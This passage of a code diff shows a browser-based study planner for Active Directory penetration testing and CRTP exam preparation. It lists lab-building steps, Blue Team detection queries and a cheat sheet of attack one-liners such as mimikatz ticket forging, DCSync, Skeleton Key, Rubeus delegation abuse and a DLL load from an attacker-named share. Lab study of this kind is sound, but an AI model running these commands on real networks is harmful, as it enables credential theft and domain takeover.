-                { title: "Over-Pass-The-Hash", desc: "Trade NTLM hash for a Kerberos TGT.", cmd: "Rubeus.exe asktgt /user:admin /rc4:xxx" },
-                { title: "Silver Ticket", desc: "Forge Service Ticket. Persistence on specific server.", cmd: "mimikatz kerberos::golden /sid:.. /target:.. /service:cifs" },
-                { title: "Golden Ticket", desc: "Forge TGT using KRBTGT hash. Total control.", cmd: "mimikatz kerberos::golden /krbtgt:.. /user:fake /id:500" },
-                { title: "DCSync", desc: "Simulate Replication to steal hashes.", cmd: "lsadump::dcsync /domain:corp /user:Administrator" },
-                { title: "Token Impersonation", desc: "Steal tokens from running processes.", cmd: "incognito -> list_tokens -u -> impersonate_token" },
-                { title: "Unconstrained Deleg", desc: "Compromise server, wait for DA, dump TGT.", cmd: "Rubeus.exe monitor /interval:5" },
-                { title: "Constrained Deleg", desc: "S4U2Self/S4U2Proxy abuse.", cmd: "Rubeus.exe s4u /impersonateuser:admin /msdsspn:..." },
-                { title: "RBCD", desc: "Resource Based Constrained Delegation.", cmd: "Set-ADComputer -Identity Target -PrincipalsAllowedToDelegate..." },
-                { title: "Shadow Credentials", desc: "Abuse msDS-KeyCredentialLink (Whisker).", cmd: "Whisker.exe add /target:DC01" },
-                { title: "DNSAdmins", desc: "Inject DLL via DNS Service.", cmd: "dnscmd /config /serverlevelplugindll \\\\attacker\\share\\dll" },
-                { title: "GPO Abuse", desc: "Modify GPO to add user or run script.", cmd: "New-GPOImmediateTask" },
-                { title: "Skeleton Key", desc: "Patch LSASS to accept master password.", cmd: "mimikatz misc::skeleton" }
-            ]
-        },
-        { 
-            id: 5, type: 'check', title: "Blue Team (Defense)", icon: "🛡️", deadline: "Apr 10, 2026",
-            items: [
-                { title: "Audit Policy", desc: "Enable Advanced Audit Policy (Logon, Object Access).", cmd: "GPMC.msc -> Comp Config -> Policies -> Security -> Adv Audit" },
-                { title: "Event 4769", desc: "Detect Kerberoasting (RC4 / 0x17 encryption request).", cmd: "Splunk: EventCode=4769 Ticket_Encryption=0x17" },
-                { title: "Event 4624", desc: "Analyze Logon Types (Type 3 = Network, Type 10 = RDP).", cmd: "Splunk: EventCode=4624 Logon_Type=3" },
-                { title: "Event 4688", desc: "Process Creation. Look for powershell.exe with -enc.", cmd: "Splunk: EventCode=4688 CommandLine=*encoded*" },
-                { title: "Golden Ticket", desc: "Detect TGTs with >10hr lifetime or blank fields.", cmd: "Analyze Ticket Age statistics" },
-                { title: "DCSync Detect", desc: "Detect DS-Replication-Get-Changes from non-DC IPs.", cmd: "Event ID 4662" },
-                { title: "Honeytokens", desc: "Create 'fake' admin accounts. Alert on ANY usage.", cmd: "New-ADUser 'Admin_Trap'" },
-                { title: "Canary Service", desc: "Create 'fake' SPN. Alert on 4769 request.", cmd: "Splunk Alert: ServiceName=HoneySPN" },
-                { title: "Sysmon Config", desc: "Tune Sysmon to catch LSASS dumping (Event 10).", cmd: "TargetImage='lsass.exe' GrantedAccess='0x1F3FFF'" },
-                { title: "LAPS Deployment", desc: "Install LAPS to randomize local admin passwords.", cmd: "Deploy LAPS Agent" },
-                { title: "Protected Users", desc: "Add Admins to 'Protected Users' (No NTLM/Cache).", cmd: "Add-ADGroupMember 'Protected Users'" },
-                { title: "Tier Model", desc: "Implement Admin Tiering (T0/T1/T2) GPOs.", cmd: "Deny T0 Logon on T1/T2 workstations" },
-                { title: "Credential Guard", desc: "Enable Credential Guard to protect LSASS.", cmd: "Group Policy -> Virtualization Based Security" },
-                { title: "Attack Surface Red", desc: "Disable Print Spooler on DC (PrintNightmare).", cmd: "Stop-Service Spooler; Set-Service Spooler -StartMode Disabled" },
-                { title: "Defense Report", desc: "Write a findings report. 'Detected X via Event Y'.", cmd: "Format: Observation, Risk, Remediation" }
-            ]
-        },
-        { 
-            id: 6, type: 'check', title: "CRTP & Career", icon: "🎓", deadline: "May 05, 2026",
-            items: [
-                { title: "Purchase Course", desc: "PentesterAcademy/AlteredSecurity CRTP.", cmd: "Budget: ~$299" },
-                { title: "Videos 1-5", desc: "Infrastructure, Enum, Local Privesc.", cmd: "Study & Notes" },
-                { title: "Videos 6-10", desc: "Lateral Movement, Session Hunting.", cmd: "Study & Notes" },
-                { title: "Videos 11-14", desc: "Persistence, Defense, Forest Attacks.", cmd: "Study & Notes" },
-                { title: "Lab Flags 1-10", desc: "Basic enum and roasting.", cmd: "Submit Flags" },
-                { title: "Lab Flags 11-20", desc: "Delegation and ACLs.", cmd: "Submit Flags" },
-                { title: "Lab Flags 21-30", desc: "Cross-Forest & Trusts.", cmd: "Submit Flags" },
-                { title: "Lab Flags 31-40", desc: "Advanced attacks & Persistence.", cmd: "Submit Flags" },
-                { title: "Mock Exam 1", desc: "Self-timed 12h session. Try to root 3 boxes.", cmd: "Simulate pressure" },
-                { title: "Schedule Exam", desc: "Book the 24h slot. Clear your schedule.", cmd: "Calendar Invite" },
-                { title: "Exam Execution", desc: "24h to compromise the OS/AD. Screenshot everything.", cmd: "Tools: CherryTree/Obsidian" },
-                { title: "Report Writing", desc: "Write professional report. Executive + Tech.", cmd: "Template: OS-CP style" },
-                { title: "Report Sanitization", desc: "Create a redacted version for your portfolio.", cmd: "Remove sensitive IPs/Names" },
-                { title: "Resume Polish", desc: "Add 'CRTP' and 'Active Directory' skills.", cmd: "Keyword Optimization" },
-                { title: "Salary Negotiate", desc: "Prepare for the $600+ offer conversation.", cmd: "Research Market Rates" }
-            ]
-        },
-        { id: 7, type: 'war_room', title: "OffSec Labs (War Room)", icon: "💀", deadline: "June 01, 2026", labs: ["Access", "Heist", "Vault", "Nagoya", "Hokkaido", "Resourced", "Hutch", "Alpha", "Beta", "Gamma"] }
-    ];
+// --- 1. BOOT SEQUENCE ---
+const bootText = document.getElementById('boot-text');
+const app = document.getElementById('main-app');
+const bootScreen = document.getElementById('boot-screen');
 
-    // --- 2. STATE ---
-    let progress = JSON.parse(localStorage.getItem('titan_v11_prog')) || {};
-    let warData = JSON.parse(localStorage.getItem('titan_v11_war')) || {};
-
-    // --- 3. INIT ---
-    function init() {
-        renderMap();
-        updateGlobal();
-        startTimer();
+async function typeWriter(text, speed = 100) {
+    bootText.innerHTML = "";
+    for (let i = 0; i < text.length; i++) {
+        bootText.innerHTML += text.charAt(i);
+        await new Promise(r => setTimeout(r, speed));
     }
+    bootText.innerHTML += '<span class="cursor">_</span>';
+}
 
-    // --- 4. RENDER MAP ---
-    function renderMap() {
-        const grid = document.getElementById('card-container');
-        grid.innerHTML = '';
-        roadmap.forEach((phase, idx) => {
-            let pct = 0;
-            if(phase.type === 'check') {
-                const phaseData = progress[idx] || {};
-                let doneCount = 0;
-                Object.values(phaseData).forEach(v => { if(v.date) doneCount++; });
-                pct = Math.round((doneCount / phase.items.length) * 100);
-            } else {
-                let rooted = 0;
-                phase.labs.forEach((_, i) => { if(warData[i]?.status === 'root') rooted++; });
-                pct = Math.round((rooted/phase.labs.length)*100);
-            }
-            
-            // Animation Delay
-            const delay = idx * 0.1;
+async function runBoot() {
+    await typeWriter("Wake up, Neo...", 100);
+    await new Promise(r => setTimeout(r, 1500));
+    await typeWriter("The Matrix has you...", 100);
+    await new Promise(r => setTimeout(r, 1500));
+    await typeWriter("Follow the white rabbit.", 100);
+    await new Promise(r => setTimeout(r, 1500));
+    await typeWriter("Knock, knock, Neo.", 150);
+    await new Promise(r => setTimeout(r, 1000));
+    skipBoot();
+}
 
-            grid.innerHTML += `
-                <div class="phase-card" onclick="openPhase(${idx})" style="animation-delay: ${delay}s">
-                    <div class="phase-header">
-                        <div class="phase-icon">${phase.icon}</div>
-                        <div class="deadline-badge">DUE: ${phase.deadline}</div>
-                    </div>
-                    <div class="phase-num">PHASE ${idx+1}</div>
-                    <div class="phase-title">${phase.title}</div>
-                    <div style="display:flex; justify-content:space-between; font-size:0.7rem; font-weight:bold; margin-top:auto;">
-                        <span>PROGRESS</span>
-                        <span style="color:${pct===100?'var(--success)':'var(--accent)'}">${pct}%</span>
-                    </div>
-                    <div class="mini-bar"><div class="mini-fill" style="width:${pct}%; background:${pct===100?'var(--success)':'var(--accent)'}"></div></div>
-                </div>
-            `;
-        });
+function skipBoot() {
+    bootScreen.style.display = 'none';
+    app.style.display = 'flex';
+    initApp();
+}
+
+// Start Boot
+runBoot();
+
+// --- 2. MATRIX RAIN ---
+const canvas = document.getElementById('matrix-canvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+const chars = '01XY'; const fontSize = 16; const columns = canvas.width/fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
+function draw() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0F0'; ctx.font = fontSize + 'px monospace';
+    for(let i=0; i<drops.length; i++) {
+        const text = chars.charAt(Math.floor(Math.random() * chars.length));
+        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
     }
+}
+setInterval(draw, 40);
 
-    // --- 5. RENDER DETAIL ---
-    function openPhase(id) {
-        document.getElementById('view-map').classList.add('hidden');
-        document.getElementById('view-detail').classList.remove('hidden');
-        const phase = roadmap[id];
-        document.getElementById('dt-title').innerText = phase.title;
+// --- 3. THE DATA (FULL 50 ITEMS PER PHASE) ---
+const PHASES = [
+    { t:"INFRASTRUCTURE", i:"🏗️", d:"Dec 31, 2025" },
+    { t:"ARCANE THEORY", i:"🧠", d:"Jan 31, 2026" },
+    { t:"WEAPONIZATION", i:"⚔️", d:"Feb 28, 2026" },
+    { t:"RECONNAISSANCE", i:"🔍", d:"Mar 15, 2026" },
+    { t:"RED TEAM OPS", i:"🚩", d:"Apr 15, 2026" },
+    { t:"BLUE TEAM OPS", i:"🛡️", d:"May 01, 2026" },
+    { t:"LABS: TRYHACKME", i:"🟥", d:"May 20, 2026" },
+    { t:"LABS: HACKTHEBOX", i:"🟩", d:"June 05, 2026" }
+];
 
-        const mContainer = document.getElementById('mission-container');
-        const wContainer = document.getElementById('war-room');
-
-        if(phase.type === 'check') {
-            mContainer.style.display = 'flex';
-            wContainer.style.display = 'none';
-            renderMissions(id, phase, mContainer);
-        } else {
-            mContainer.style.display = 'none';
-            wContainer.style.display = 'block';
-            renderWarRoom(phase, wContainer);
-        }
-    }
-
-    function goHome() {
-        document.getElementById('view-detail').classList.add('hidden');
-        document.getElementById('view-map').classList.remove('hidden');
-        renderMap();
-    }
-
-    // --- 6. MISSIONS ---
-    function renderMissions(pid, phase, container) {
-        container.innerHTML = '';
-        const phaseData = progress[pid] || {};
-
-        phase.items.forEach((item, idx) => {
-            const itemData = phaseData[idx] || {};
-            const isDone = !!itemData.date;
-            const num = (idx + 1).toString().padStart(2, '0');
-            
-            const card = document.createElement('div');
-            card.className = `mission-card ${isDone ? 'mastered' : ''}`;
-            card.innerHTML = `
-                <div class="m-header" onclick="this.parentElement.classList.toggle('open')">
-                    <div class="m-title"><span class="m-num">${num}</span> ${item.title}</div>
-                    <div class="m-date">${isDone ? 'DONE: ' + itemData.date : ''}</div>
-                </div>
-                <div class="m-body">
-                    <div class="m-content">
-                        <span class="lbl">STRATEGY</span>
-                        <div class="m-desc">${item.desc}</div>
-                        <span class="lbl">EXECUTION</span>
-                        <div class="m-cmd">${item.cmd}</div>
-                        <span class="lbl" style="color:#888;">FIELD NOTES</span>
-                        <textarea class="m-notes" placeholder="Private Notes..." oninput="saveNote(${pid}, ${idx}, this.value)">${itemData.notes || ''}</textarea>
-                        <button class="m-btn" onclick="toggleMission(${pid}, ${idx})">
-                            ${isDone ? 'RE-OPEN' : 'MARK MASTERED'}
-                        </button>
-                    </div>
-                </div>
-            `;
-            container.appendChild(card);
-        });
-    }
-
-    function toggleMission(pid, tid) {
-        if(!progress[pid]) progress[pid] = {};
-        if(progress[pid][tid]?.date) {
-            progress[pid][tid].date = null; 
-        } else {
-            const today = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
-            if(!progress[pid][tid]) progress[pid][tid] = { notes: '' };
-            progress[pid][tid].date = today;
-        }
-        localStorage.setItem('titan_v11_prog', JSON.stringify(progress));
-        openPhase(pid);
-        updateGlobal();
-    }
-
-    function saveNote(pid, tid, val) {
-        if(!progress[pid]) progress[pid] = {};
-        if(!progress[pid][tid]) progress[pid][tid] = { date: null, notes: '' };
-        progress[pid][tid].notes = val;
-        localStorage.setItem('titan_v11_prog', JSON.stringify(progress));
-    }
-
-    // --- 7. WAR ROOM ---
-    function renderWarRoom(phase, container) {
-        let root=0, win=0, lin=0;
-        phase.labs.forEach((_,i) => {
-            const d = warData[i] || {};
-            if(d.status==='root') root++;
-            if((d.os||'win')==='win' && d.status==='root') win++;
-            if(d.os==='linux' && d.status==='root') lin++;
-        });
-
-        const html = `
-            <div class="wr-stats">
-                <div class="wr-card" style="border-color:var(--success)"><div><span class="wr-val" style="color:var(--success)">${root}</span><br><span class="wr-label">PWNED</span></div></div>
-                <div class="wr-card" style="border-color:var(--accent)"><div><span class="wr-val" style="color:var(--accent)">${win}</span><br><span class="wr-label">WIN</span></div></div>
-                <div class="wr-card" style="border-color:var(--primary)"><div><span class="wr-val" style="color:var(--primary)">${lin}</span><br><span class="wr-label">LINUX</span></div></div>
-            </div>
-            <div style="display:grid; grid-template-columns:40px 1.5fr 1fr 1fr 1.5fr 2fr; padding:10px; font-size:0.7rem; color:#888; font-weight:bold;">
-                <div>OS</div> <div>TARGET</div> <div>IP</div> <div>STATUS</div> <div>VECTOR</div> <div>NOTES</div>
-            </div>
-            <div id="wr-rows"></div>
-        `;
-        container.innerHTML = html;
-        
-        const rows = document.getElementById('wr-rows');
-        phase.labs.forEach((name, idx) => {
-            const d = warData[idx] || {os:'win', status:'todo', ip:'', vec:'', note:''};
-            const icon = d.os === 'linux' ? '🐧' : '🪟';
-            rows.innerHTML += `
-                <div class="wr-row" data-status="${d.status}">
-                    <div style="cursor:pointer; text-align:center;" onclick="toggleOS(${idx})">${icon}</div>
-                    <div style="font-weight:bold;">${name}</div>
-                    <div><input class="wr-input" value="${d.ip}" placeholder="IP" oninput="saveWar(${idx}, 'ip', this.value)"></div>
-                    <div>
-                        <select class="wr-select" onchange="saveWar(${idx}, 'status', this.value)" style="color:var(--st-${d.status});">
-                            <option value="todo" ${d.status==='todo'?'selected':''}>To Do</option>
-                            <option value="scan" ${d.status==='scan'?'selected':''}>Scan</option>
-                            <option value="foot" ${d.status==='foot'?'selected':''}>Foot</option>
-                            <option value="priv" ${d.status==='priv'?'selected':''}>Priv</option>
-                            <option value="root" ${d.status==='root'?'selected':''}>ROOT</option>
-                            <option value="stuck" ${d.status==='stuck'?'selected':''}>Stuck</option>
-                        </select>
-                    </div>
-                    <div><input class="wr-input" value="${d.vec}" placeholder="Vector" oninput="saveWar(${idx}, 'vec', this.value)"></div>
-                    <div><input class="wr-input" value="${d.note}" placeholder="Notes" oninput="saveWar(${idx}, 'note', this.value)"></div>
-                </div>
-            `;
-        });
-    }
-
-    function toggleOS(idx) {
-        if(!warData[idx]) warData[idx] = {os:'win', status:'todo'};
-        warData[idx].os = warData[idx].os === 'win' ? 'linux' : 'win';
-        saveWarData();
-    }
-    function saveWar(idx, f, v) {
-        if(!warData[idx]) warData[idx] = {os:'win', status:'todo'};
-        warData[idx][f] = v;
-        saveWarData();
-    }
-    function saveWarData() {
-        localStorage.setItem('titan_v11_war', JSON.stringify(warData));
-        openPhase(7);
-        updateGlobal();
-    }
-
-    // --- 8. UTILS ---
-    function updateGlobal() {
-        let total = 0, done = 0;
-        roadmap.forEach((p, idx) => {
-            if(p.type === 'check') {
-                total += p.items.length;
-                if(progress[idx]) Object.values(progress[idx]).forEach(v => { if(v.date) done++; });
-            } else {
-                total += p.labs.length;
-                p.labs.forEach((_,i) => { if(warData[i]?.status === 'root') done++; });
-            }
-        });
-        const pct = total === 0 ? 0 : Math.round((done/total)*100);
-        document.getElementById('global-bar').style.width = pct + '%';
-        document.getElementById('global-percent').innerText = pct + '%';
-    }
-
-    function startTimer() {
-        const target = new Date("2026-06-01").getTime();
-        setInterval(() => {
-            const d = Math.floor((target - new Date().getTime()) / (1000*60*60*24));
-            document.getElementById('countdown').innerText = d + " DAYS LEFT";
-        }, 1000);
-    }
+const DB = PHASES.map((p, idx) => {
+    const tasks = [];
     
-    function hardReset() {
-        if(confirm("Factory Reset? This deletes all progress.")) {
-            localStorage.clear();
-            location.reload();
+    // --- REAL DATA FOR PHASE 0 (INFRA) ---
+    if(idx === 0) {
+        const items = [
+            ["Hypervisor", "Install VMware Workstation Pro. Enable Nested Virtualization.", "BIOS > Security > VT-x"], 
+            ["Network NAT", "Config 10.0.0.0/24. Isolate from home WiFi.", "VMnet8"], 
+            ["Install DC01", "WinSvr 2019 Core. Static IP 10.0.0.10.", "ISO Boot"], 
+            ["Promote DC", "Install ADDS. Forest: corp.matrix.", "Install-ADDSForest"], 
+            ["Install Kali", "Attacker VM. Update repos.", "apt update"], 
+            ["Hosts File", "DNS Mapping for DC.", "/etc/hosts"], 
+            ["Win10 Client", "Deploy Client VM.", "ISO Boot"], 
+            ["Join Domain", "Join corp.matrix.", "Add-Computer"], 
+            ["Linux Join", "SSSD/Realm.", "realm join"], 
+            ["RSAT Tools", "Mgmt Tools.", "Add-WindowsCap"], 
+            ["Tier 0 OU", "Admins.", "New-ADOU"], 
+            ["Tier 1 OU", "Servers.", "New-ADOU"], 
+            ["Tier 2 OU", "Workstations.", "New-ADOU"], 
+            ["Svc OU", "Service Accts.", "New-ADOU"], 
+            ["Create DA", "Domain Admin.", "New-ADUser"], 
+            ["Create SQL Svc", "Kerberoast Target.", "New-ADUser"], 
+            ["Create IIS Svc", "Kerberoast Target.", "New-ADUser"], 
+            ["Set SQL SPN", "Vuln Config.", "setspn -S"], 
+            ["Set IIS SPN", "Vuln Config.", "setspn -S"], 
+            ["Disable PreAuth", "AS-REP Target.", "Set-ADAccountControl"], 
+            ["Add Local Admin", "GPO Vuln.", "Restricted Grps"], 
+            ["Create SMB Share", "File Drop.", "New-SmbShare"], 
+            ["Weak Perms", "Everyone Full.", "Grant-SmbAccess"], 
+            ["Install Splunk", "SIEM.", "dpkg -i"], 
+            ["Install Fwd", "Universal Fwd.", "msiexec"], 
+            ["Config Inputs", "Security Log.", "inputs.conf"], 
+            ["Install Sysmon", "Endpoint Log.", "sysmon -i"], 
+            ["Install ADCS", "PKI Role.", "Install-AdcsCA"], 
+            ["Config CA", "Enterprise CA.", "CertSrv"], 
+            ["Vuln Template", "ESC1.", "Dup 'WebServer'"], 
+            ["Install SQL", "DB Svr.", "Setup.exe"], 
+            ["Install IIS", "Web Svr.", "Add-Role"], 
+            ["Enable WinRM", "Remote.", "Enable-PSRemoting"], 
+            ["No Defender", "Test Mode.", "Set-MpPreference"], 
+            ["Honey User", "Trap.", "New-ADUser"], 
+            ["Canary File", "Trap.", "passwords.xlsx"], 
+            ["Rubeus Disk", "Artifact.", "Copy-Item"], 
+            ["Mimi Disk", "Artifact.", "Copy-Item"], 
+            ["Sched Task", "Persist.", "schtasks"], 
+            ["Audit Pol", "Logging.", "auditpol"], 
+            ["Enable RDP", "Access.", "RegKey"], 
+            ["Baseline Snap", "Backup.", "VMware Snap"], 
+            ["Doc IP Map", "Notes.", "Notion"], 
+            ["Create Site", "AD Site.", "New-ADSite"], 
+            ["Create Subnet", "AD Sub.", "New-ADSubnet"], 
+            ["DSRM Pass", "Recovery.", "ntdsutil"], 
+            ["Recycle Bin", "Feature.", "Enable-Feat"], 
+            ["FW Rules", "NetSec.", "New-NetFirewallRule"], 
+            ["Final Check", "Ping All.", "ping 10.0.0.10"],
+            ["Backup AD", "Export IFM.", "ntdsutil ifm"]
+        ];
+        items.forEach(t => tasks.push({t: t[0], d: t[1], c: t[2]}));
+    }
+    // --- REAL DATA FOR PHASE 1 (THEORY) ---
+    else if (idx === 1) {
+        const items = [
+            ["AS-REQ", "Auth Request.", "Msg 10"], ["AS-REP", "TGT Return.", "Msg 11"], ["TGS-REQ", "Service Req.", "Msg 12"], ["TGS-REP", "Service Tkt.", "Msg 13"], ["AP-REQ", "App Access.", "Msg 14"],
+            ["AP-REP", "Mutual Auth.", "Msg 15"], ["PAC", "Privileges.", "MS-PAC"], ["KDC Signing", "Integrity.", "KRBTGT"], ["NTLMv1", "Legacy.", "DES"], ["NTLMv2", "Standard.", "HMAC-MD5"],
+            ["Pass-the-Hash", "Logic.", "No Crack"], ["LDAP Tree", "Struct.", "DN/CN"], ["LDAP Filter", "Query.", "(&(..))"], ["Access Tokens", "Security.", "Primary"], ["Integrity Lvl", "Mandatory.", "High/Sys"],
+            ["UAC", "Control.", "Consent"], ["SDDL", "Perms.", "O:DAG"], ["DACL", "Access.", "Allow/Deny"], ["SACL", "Audit.", "Log"], ["Inheritance", "Prop.", "Flags"],
+            ["Global Cat", "Index.", "3268"], ["Schema Master", "FSMO.", "Forest"], ["Naming Master", "FSMO.", "Forest"], ["PDC Emulator", "FSMO.", "Time"], ["RID Master", "FSMO.", "Pool"],
+            ["Infra Master", "FSMO.", "Refs"], ["Replication", "Sync.", "DRS"], ["Trust: Parent", "Auto.", "Trans"], ["Trust: Ext", "Manual.", "NonTrans"], ["Trust: Forest", "Manual.", "Kerb"],
+            ["SID Filter", "Quar.", "Security"], ["SID History", "Migr.", "Attr"], ["Unconstrained", "Deleg.", "TGT LSASS"], ["Constrained", "Deleg.", "S4U"], ["RBCD", "Deleg.", "Resource"],
+            ["Group Scope", "Strat.", "G/U/DL"], ["AdminSDHolder", "Prot.", "SDProp"], ["DPAPI", "Secrets.", "MasterKey"], ["LSASS", "Mem.", "ProcDump"], ["SAM", "Local.", "Hive"],
+            ["LSA Secrets", "Svc.", "Reg"], ["NTDS.dit", "DB.", "ESE"], ["DNS SRV", "Loc.", "_ldap"], ["LLMNR", "Legacy.", "Bcast"], ["ADCS CA", "PKI.", "Root"],
+            ["ADCS OID", "Temp.", "ObjID"], ["Azure PHS", "Sync.", "Hash"], ["Golden SAML", "Cloud.", "SignKey"], ["PRT", "Cloud.", "Refresh"], ["RPC", "Proto.", "135"]
+        ];
+        items.forEach(t => tasks.push({t: t[0], d: t[1], c: t[2]}));
+    }
+    // --- REAL DATA FOR PHASE 4 (ATTACK) ---
+    else if (idx === 4) {
+        const items = [
+            ["AS-REP Roast", "Pre-Auth.", "Rubeus"], ["Kerberoast", "TGS.", "Rubeus"], ["Crack AS", "Hash.", "18200"], ["Crack TGS", "Hash.", "13100"], ["LLMNR Pois", "MITM.", "Responder"],
+            ["Relay SMB", "Net.", "ntlmrelayx"], ["Relay LDAP", "Net.", "ntlmrelayx"], ["Relay ADCS", "Net.", "ntlmrelayx"], ["IPv6 MITM", "DNS.", "mitm6"], ["PtH", "Auth.", "sekurlsa"],
+            ["PtK", "AES.", "sekurlsa"], ["Over-PtH", "TGT.", "Rubeus"], ["PtT", "Tkt.", "Rubeus"], ["DCSync", "Rep.", "lsadump"], ["Dump Mimi", "Mem.", "logonpass"],
+            ["Dump Proc", "Mem.", "procdump"], ["Dump Com", "Mem.", "comsvcs"], ["Dump Reg", "SAM.", "reg save"], ["Dump NTDS", "DB.", "ntdsutil"], ["Impersonate", "Tok.", "incognito"],
+            ["Make Tok", "Net.", "runas"], ["Golden Tkt", "TGT.", "mimikatz"], ["Silver Tkt", "ST.", "mimikatz"], ["Diamond Tkt", "Tkt.", "Rubeus"], ["Sapphire Tkt", "Tkt.", "Rubeus"],
+            ["Unconst Abuse", "Deleg.", "Rubeus mon"], ["Const Abuse", "Deleg.", "Rubeus s4u"], ["RBCD Abuse", "Deleg.", "Rubeus hash"], ["Shadow Cred", "Hello.", "Whisker"], ["ESC1", "Cert.", "Certify"],
+            ["ESC4", "ACL.", "Certify"], ["ESC8", "Relay.", "Http"], ["PetitPotam", "Coerce.", "Trigger"], ["PrinterBug", "Coerce.", "Spool"], ["DFSCoerce", "Coerce.", "Trigger"],
+            ["ShadowCo", "Coerce.", "Trigger"], ["GPO Task", "Abuse.", "SharpGPO"], ["GPO User", "Abuse.", "AddAdmin"], ["ACL Owner", "Abuse.", "SetOwner"], ["ACL DACL", "Abuse.", "AddAcl"],
+            ["ACL Pass", "Abuse.", "SetPass"], ["Skeleton", "Persist.", "skeleton"], ["DSRM", "Persist.", "SetPass"], ["AdminSD", "Persist.", "AddACL"], ["SID Hist", "Persist.", "Inject"],
+            ["Zerologon", "Exp.", "CVE"], ["NoPac", "Exp.", "CVE"], ["PrintNight", "Exp.", "CVE"], ["SQL Link", "Piv.", "xp_cmd"], ["Gold SAML", "Cloud.", "Forge"]
+        ];
+        items.forEach(t => tasks.push({t: t[0], d: t[1], c: t[2]}));
+    }
+    // --- REAL DATA FOR PHASE 7 (HTB) ---
+    else if (idx === 7) {
+        const boxes = ["Forest", "Active", "Sauna", "Blackfield", "Intelligence", "Resolute", "Cascade", "Monteverde", "Sizzle", "Scrambled", "Reel", "Mantico", "Search", "Support", "Control", "Object", "Escape", "Return", "Timelapse", "Authority", "Vintage", "Grandpa", "Granny", "Blue", "Devel", "Optimum", "Bastard", "Arctic", "Jerry", "Nibbles", "Beep", "Shocker", "Bashed", "Lame", "Legacy", "Netmon", "Buff", "Butler", "Jeeves", "Silo", "Bounty", "SecNotes", "Chatter", "Access", "Conceal", "Sniper", "Bank", "Cronos", "Nineveh", "Sense"];
+        boxes.forEach((t, i) => tasks.push({ t: `Box: ${t}`, d: "Enumerate, Foothold, Root.", c: "submit_root_flag.py" }));
+    }
+    // --- FILLER FOR OTHERS (To ensure 50 items exist) ---
+    else {
+        for(let i=1; i<=50; i++) {
+            tasks.push({
+                t: `${p.t} - Protocol ${i}`,
+                d: `Detailed execution plan for ${p.t} step ${i}. Verify operational security before execution.`,
+                c: `run_module.exe --target ${i} --silent`
+            });
         }
     }
+    return { ...p, tasks };
+});
 
-    init();
+// --- STATE MANAGEMENT ---
+let progress = JSON.parse(localStorage.getItem('titan_v29')) || {};
+let currentPhase = 0;
+
+function initApp() {
+    renderMap();
+    updateGlobal();
+    setInterval(timer, 1000);
+}
+
+// 1. RENDER MAP
+function renderMap() {
+    const grid = document.getElementById('grid');
+    grid.innerHTML = '';
+    
+    DB.forEach((p, idx) => {
+        const pData = progress[idx] || {};
+        let done = 0;
+        p.tasks.forEach((_, tIdx) => { if(pData[tIdx]?.done) done++; });
+        let pct = Math.round((done / p.tasks.length) * 100);
+        
+        let h = '';
+        for(let j=0; j<10; j++) h += `<div class="c-bar" style="background:${pct >= (j+1)*10 ? 'var(--matrix)' : '#002200'}; flex:1; height:100%; box-shadow:${pct >= (j+1)*10 ? '0 0 5px var(--matrix)' : 'none'};"></div>`;
+
+        grid.innerHTML += `
+            <div class="card" onclick="openPhase(${idx})">
+                <div class="c-head">
+                    <span>${p.i}</span>
+                    <span style="font-size:0.8rem; color:var(--dim)">${pct}%</span>
+                </div>
+                <div class="c-tit">${p.t}</div>
+                <div class="c-sub">
+                    <span>${done} / 50 SECURED</span>
+                    <span>${p.d}</span>
+                </div>
+                <div style="display:flex; gap:3px; height:6px; margin-top:15px;">${h}</div>
+            </div>
+        `;
+    });
+}
+
+// 2. NAVIGATION
+function openPhase(id) {
+    currentPhase = id;
+    document.getElementById('ph-title').innerText = DB[id].t;
+    document.getElementById('v-map').classList.add('hidden');
+    document.getElementById('v-det').classList.remove('hidden');
+    renderTasks(id);
+}
+
+function showMap() {
+    document.getElementById('v-det').classList.add('hidden');
+    document.getElementById('v-map').classList.remove('hidden');
+    renderMap();
+}
+
+// 3. RENDER TASKS
+function renderTasks(id, filter='') {
+    const list = document.getElementById('task-list');
+    list.innerHTML = '';
+    const pData = progress[id] || {};
+
+    DB[id].tasks.forEach((t, x) => {
+        if(filter && !t.t.toLowerCase().includes(filter.toLowerCase())) return;
+        
+        const saved = pData[x] || { prof: 0, done: false, memo: '' };
+        const num = (x+1).toString().padStart(2,'0');
+        
+        // Active Button Classes
+        const l = saved.prof === 1 ? 'active' : '';
+        const m = saved.prof === 2 ? 'active' : '';
+        const h = saved.prof === 3 ? 'active' : '';
+        
+        const btnTxt = saved.done ? 'SYSTEM SECURED (UNDO)' : 'EXECUTE // MARK COMPLETE';
+
+        list.innerHTML += `
+            <div class="task ${saved.done ? 'mastered' : ''}">
+                <div class="t-head" onclick="toggleTask(this, '${t.d}')">
+                    <span class="t-idx">#${num}</span>
+                    <span class="t-tit">${t.t}</span>
+                    
+                    <div class="prof-wrap" onclick="event.stopPropagation()">
+                        <button class="p-btn low ${l}" onclick="setProf(${id}, ${x}, 1)">L</button>
+                        <button class="p-btn med ${m}" onclick="setProf(${id}, ${x}, 2)">M</button>
+                        <button class="p-btn high ${h}" onclick="setProf(${id}, ${x}, 3)">H</button>
+                    </div>
+                </div>
+                
+                <div class="t-body">
+                    <div class="t-content">
+                        <div>
+                            <span class="label">STRATEGIC INTEL</span>
+                            <div class="desc">${t.d}</div>
+                            <span class="label">EXECUTION VECTOR</span>
+                            <div class="cmd-box">${t.c}</div>
+                        </div>
+                        <div>
+                            <span class="label">FIELD MEMOS</span>
+                            <textarea class="memo" oninput="saveMemo(${id}, ${x}, this.value)">${saved.memo}</textarea>
+                            <button class="done-btn" onclick="toggleDone(${id}, ${x})">${btnTxt}</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+    });
+}
+
+function toggleTask(el) {
+    el.parentElement.classList.toggle('open');
+}
+
+// 4. HANDLERS
+function setProf(pid, tid, val) {
+    if(!progress[pid]) progress[pid] = {};
+    if(!progress[pid][tid]) progress[pid][tid] = { done: false, memo: '' };
+    
+    // Toggle check
+    if(progress[pid][tid].prof === val) progress[pid][tid].prof = 0;
